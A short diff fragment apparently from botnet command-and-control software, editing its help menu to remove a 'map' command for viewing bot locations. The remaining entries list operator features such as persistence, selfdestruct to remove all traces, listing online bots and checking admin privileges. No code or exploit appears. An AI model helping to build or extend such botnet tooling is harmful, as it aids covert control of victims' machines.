@@ -9,7 +9,6 @@
           ║     persistence                                ║     Set persistence                           ║
           ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
           ║     list                                       ║     List online bots                          ║
-          ║     map                                        ║     View all bots general location on map     ║
           ║     clear                                      ║     Clear console                             ║
           ║     update                                     ║     Update client list                        ║
           ║     admincheck                                 ║     Check admin privileges                    ║
